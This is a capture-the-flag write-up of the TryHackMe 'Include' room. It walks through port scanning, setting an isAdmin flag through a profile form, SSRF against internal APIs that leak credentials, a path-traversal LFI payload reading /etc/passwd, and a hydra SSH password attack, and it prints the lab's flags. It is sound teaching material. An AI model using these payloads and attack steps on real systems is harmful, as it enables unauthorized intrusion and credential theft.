# Include

Use your server exploitation skills to take control of a web app.

![Questions to Answer](/img/THMInclude/1.png)

---

> **Disclaimer**
>
> This write-up is based on a controlled lab/CTF scenario designed for educational purposes. As such, it does not fully reflect real-world penetration testing methodologies or constraints.
>
> In this environment, certain assumptions, hints, and predefined attack paths are intentionally provided to guide the exploitation process. These elements significantly reduce the uncertainty and reconnaissance effort typically required in real-world engagements.
>
> As a result, the techniques demonstrated here may not follow standard penetration testing procedures, where targets, vulnerabilities, and attack vectors must be identified without prior knowledge.
>
> This write-up should be viewed as a learning resource focused on understanding specific vulnerabilities and exploitation techniques, rather than a representation of a full-scope, real-world security assessment.

---

## 1. Initial Enumeration

Since this is a controlled CTF environment, we already know that the target is web-based. Any exploitation involving non-web services is considered out of scope for this challenge. Therefore, instead of spending time enumerating all possible services in depth, we focus on identifying the relevant web service.

Additionally, the web application is not hosted on the default HTTP port (80), so a full port scan is performed to discover the correct service.

### Port Scanning

A full TCP port scan was conducted using Nmap:

```bash
nmap -p- 10.48.177.144
```

#### Scan Results

![Nmap Scan Output](/img/THMInclude/2.png)

For better readability, the output is also provided below:

```bash
┌──(l㉿Strider)-[~]
└─$ nmap -p- 10.48.177.144
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 05:49 +0530
Nmap scan report for 10.48.177.144
Host is up (0.071s latency).
Not shown: 65527 closed tcp ports (reset)

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
4000/tcp  open  remoteanything
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
```

#### **Analysis**

The scan revealed multiple open services; however, based on the defined scope of this challenge, only web-based services are relevant for further exploitation.

Among the discovered ports, **4000/tcp** stands out as a likely candidate for hosting a web application, as it is commonly used for non-standard web services.

#### **Web Enumeration (Port 4000)**

Upon visiting the application running on port 4000, a web interface is presented:

![Web Application on Port 4000](/img/THMInclude/3.png)

The page explicitly provides default credentials: `guest:guest`

While this simplifies authentication, it is likely an intended entry point rather than the final target.

#### **Additional Service Discovery (Port 50000)**

Further inspection reveals another web service running on port **50000/tcp**:

This application appears to be the **SysMon** portal referenced in the objectives.

![Web Application on Port 50000](/img/THMInclude/4.png)

Accessing the login interface:

![SysMon Login Page](/img/THMInclude/5.png)

#### **Initial Access Attempts**

Basic authentication bypass techniques, including common credentials and simple SQL injection payloads, were attempted but proved unsuccessful.

Hidden directory enumeration was also performed, but it did not reveal any useful findings.

```bash
┌──(l㉿Strider)-[~]
└─$ dirb http://10.48.177.144:50000/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar 24 06:22:27 2026
URL_BASE: http://10.48.177.144:50000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.48.177.144:50000/ ----
+ http://10.48.177.144:50000/index.php (CODE:200|SIZE:1611)                                                                                                                                
==> DIRECTORY: http://10.48.177.144:50000/javascript/                                                                                                                                      
+ http://10.48.177.144:50000/phpmyadmin (CODE:403|SIZE:281)                                                                                                                                
+ http://10.48.177.144:50000/server-status (CODE:403|SIZE:281)                                                                                                                             
==> DIRECTORY: http://10.48.177.144:50000/templates/                                                                                                                                       
==> DIRECTORY: http://10.48.177.144:50000/uploads/                                                                                                                                         
                                                                                                                                                                                           
---- Entering directory: http://10.48.177.144:50000/javascript/ ----
==> DIRECTORY: http://10.48.177.144:50000/javascript/jquery/                                                                                                                               
                                                                                                                                                                                           
---- Entering directory: http://10.48.177.144:50000/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                           
---- Entering directory: http://10.48.177.144:50000/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                           
---- Entering directory: http://10.48.177.144:50000/javascript/jquery/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Mar 24 06:43:01 2026
DOWNLOADED: 9224 - FOUND: 3
```

Given that the challenge description indicates a **server-side exploitation** scenario, it is reasonable to conclude that direct login bypass techniques are not the intended solution path.

### Conclusion

Since the SysMon portal does not allow trivial access, and the port 4000 application provides valid credentials, the logical next step is to authenticate into the port 4000 application and continue the attack from there.

## 2. Exploitation via Port 4000

After logging in using the provided credentials (`guest:guest`), we are redirected to:

```url
http://10.48.177.144:4000/index
```

This page displays multiple user profiles, including the currently authenticated **guest** account.

![Index Page](/img/THMInclude/6.png)

### 2.1 Profile Interaction

Clicking on **“View Profile”** under the *My Profile* section redirects us to:

```url
http://10.48.177.144:4000/friend/1
```

This corresponds to the profile of the currently logged-in user.

![Profile Page](/img/THMInclude/7.png)

The **Friend Details** section exposes the following data:

```json
{
  "id": 1,
  "name": "guest",
  "age": 25,
  "country": "UK",
  "albums": [{"name":"USA Trip","photos":"www.thm.me"}],
  "isAdmin": false,
  "profileImage": "/images/prof1.avif"
}
```

### 2.2 Input Handling Observation

The page also contains a **POST form** titled:

> *“Recommend an Activity to guest”*

It includes two input fields:

* **Activity Type**
* **Activity Name**

To test input handling, arbitrary data (`filed1:field2`) was submitted:

![POST Form Input](/img/THMInclude/8.png)

After submission, the input is directly reflected in the user profile:

![Injected Data in Profile](/img/THMInclude/9.png)

This indicates:

* Possibility of Lack of proper input validation or sanitization
* User-controlled data being stored and rendered directly

### 2.3 Privilege Escalation via Prototype Pollution

The profile contains a sensitive field:

```json
"isAdmin": false
```

This suggests role-based access control is enforced via this property.

Given the unsafe handling of user input, we attempt to manipulate this field by injecting `isAdmin:true` into the input fields respectively:

![Injection Attempt](/img/THMInclude/10.png)

After submission, the profile reflects the modified value:

![Admin Access Gained](/img/THMInclude/11.png)

The `isAdmin` flag is now set to `"true"`, effectively granting administrative privileges.

### 2.4 Admin Functionality Access

With elevated privileges, new options become available:

* **API**
* **Settings**

![Admin Options Enabled](/img/THMInclude/12.png)

### 2.5 Internal API Discovery

Navigating to:

```url
http://10.48.177.144:4000/admin/api
```

reveals an **API Dashboard** exposing internal endpoints:

![API Dashboard](/img/THMInclude/13.png)

#### Internal API

```json
GET http://127.0.0.1:5000/internal-api HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}
```

#### Admin Credentials API

```json
GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "ReviewAppUsername": "admin",
  "ReviewAppPassword": "xxxxxx",
  "SysMonAppUsername": "administrator",
  "SysMonAppPassword": "xxxxxxxxx"
}
```

These endpoints are restricted to localhost, indicating they are not directly accessible externally.

### 2.6 SSRF via Admin Settings

Navigating to:

```url
http://10.48.177.144:4000/admin/settings
```

reveals a feature that fetches a banner image from a user-supplied URL:

![Settings Page](/img/THMInclude/14.png)

This functionality can potentially be abused for **Server-Side Request Forgery (SSRF)**.

To validate this, a request was made to an attacker-controlled server:

![Custom URL Input](/img/THMInclude/15.png)

After submission, the page updates:

![Page Update After Submission](/img/THMInclude/16.png)

Simultaneously, a request is observed on the attacker’s server:

![Incoming Request Logged](/img/THMInclude/17.png)

This confirms that the application is making server-side requests to arbitrary URLs.

>**Note to self**
>
> In this scenario, the application fetches remote content from a user-supplied URL and displays it in raw format. This confirms that the behavior is limited to **data retrieval**, not execution.
>
> Even if an attacker hosts a malicious payload (e.g., a reverse shell), the server will only retrieve the content. It will **not execute it**, meaning the payload remains inert.
>
> For code execution to occur, the application must explicitly process the retrieved content as > executable logic. This typically involves unsafe server-side practices such as:
>
> * Interpreting user-controlled input as code (e.g., using `eval()`-like behavior)
> * Dynamically loading and executing external resources
> * Passing user input into system-level command execution (e.g., `exec()`-like functions)
> * Writing attacker-controlled content to disk and subsequently executing it
>
> Without such behavior, the application treats external content purely as data.

The application is vulnerable to **SSRF**, allowing interaction with internal services such as those exposed on `127.0.0.1:5000`.

The next step is to leverage this behavior to access internal APIs and extract sensitive information, potentially leading to further compromise of the SysMon application.

### 2.7 Retrieving API responses

![Admin API](/img/THMInclude/18.png)

```txt
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
```

Decoded:

```json
{
  "ReviewAppUsername":"admin",
  "ReviewAppPassword":"admin@!!!",
  "SysMonAppUsername":"administrator",
  "SysMonAppPassword":"S$9$qk6d#**LQU"
}
```

Now we can login at `http://10.48.177.144:50000/`

![Dashboard with flag](/img/THMInclude/19.png)

```flag
THM{!50_55Rf_1S_d_k3Y??!}
```

---

> **Note**
>
> The target IP address may differ between sections of this write-up. This is due to the TryHackMe environment resetting the target machine when it is shut down or restarted, resulting in a new IP being assigned.
>
> This clarification is provided to avoid confusion, as the steps demonstrated may reference different IP addresses while targeting the same machine instance.

---

## 3. Exploitation via Port 50000

On the `dashboard.php` page, a profile image is rendered using the following endpoint:

![Highlighting profile.php?img=profile.png in the page source](/img/THMInclude/20.png)

```bash
profile.php?img=profile.png
```

This pattern suggests that the application dynamically loads images via a server-side script. Instead of directly serving static files, the backend likely:

* Retrieves the requested file
* Processes or validates it (e.g., resizing, access control, logging)
* Returns it to the client

Such implementations are common when applications need centralized control over file access rather than exposing files directly.

### Direct Access to the Endpoint

Visiting the endpoint directly:

![/profile.php?img=profile.png on a new tab](/img/THMInclude/21.png)

The response displays raw binary data interpreted as text, indicating that the script is reading and returning file contents without proper handling of content type.

This behavior suggests that the `img` parameter is being used to fetch files from the server.

### Testing for Local File Inclusion (LFI)

Given that user input is directly used to retrieve files, the endpoint is a strong candidate for **Local File Inclusion (LFI)**.

To test this, fuzzing was performed using `ffuf` with a common LFI payload wordlist:

```bash
ffuf -u "http://10.48.191.115:50000/profile.php?img=FUZZ" \
-w LFI-Jhaddix.txt \
-b "PHPSESSID=js50mta5t2h3ad43iho8onj9cj" \
-mc 200 \
-fs 0
```

Criteria used:

* **Status Code 200** → Valid response
* **Non-zero content length** → Indicates meaningful output

![ffuf results](/img/THMInclude/22.png)

Multiple payloads returned valid responses, primarily differing in directory traversal depth.

### Exploiting LFI

One of the successful payloads was used:

```bash
....//....//....//....//....//....//....//....//....//....//etc/passwd
```

Accessing it via the browser:

![LFI result on browser](/img/THMInclude/23.png)

The contents of `/etc/passwd` are successfully retrieved, confirming the presence of an LFI vulnerability.

Switching to page source improves readability:

![LFI result on browser but on view-source](/img/THMInclude/24.png)

From this, some potential system users are identified:

```txt
ubuntu
tryhackme
joshua
charles
```

### Credential Attack via SSH

Since SSH (port 22) was previously identified as open, these usernames were used in a password attack.

A wordlist attack was performed using `hydra` with the `rockyou.txt` wordlist:

![Wordlist attack result using hydra](/img/THMInclude/25.png)

two accounts were found to share a weak password:

```txt
123456
```

### Gaining Access and Retrieving the Flag

Using valid credentials, SSH access was obtained. From there, the second flag was retrieved from the specified location:

```bash
/var/www/html
```

![Flag retrieval](/img/THMInclude/26.png)

```txt
THM{505eb0fb8a9f32853b4d955e1f9123ea}
```

---
